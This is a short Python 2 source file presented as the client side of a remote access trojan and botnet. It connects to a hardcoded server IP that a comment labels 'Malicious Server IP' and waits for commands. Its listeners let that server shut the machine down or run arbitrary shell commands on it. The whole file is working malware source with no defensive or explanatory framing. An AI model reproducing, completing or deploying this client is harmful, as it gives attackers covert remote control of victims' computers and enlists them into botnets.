# A Python RAT n' Botnet
#  by Landon in Python2
#    CLIENT-SIDE C0DE

from urllib2 import urlopen
from socketIO_client import SocketIO
import os

bigBro = '75.138.89.68' # Malicious Server IP.
socket = SocketIO("http://" + bigBro, 1984)

# Functions for socket listeners.
class listeners:

    def log(*args):
        print(args[0])

    def kill(*args):
        if os.name == 'nt': # - Windows NT -
            os.system("shutdown -s")
        else:               # - GNU/Linux & MacOS -
            os.system("shutdown now")

    def shell(*args):
        os.system(args[0])

# These three lines set and wait for listeners.
for function in listeners.__dict__:
    socket.on(function, listeners.__dict__[function])
socket.wait()
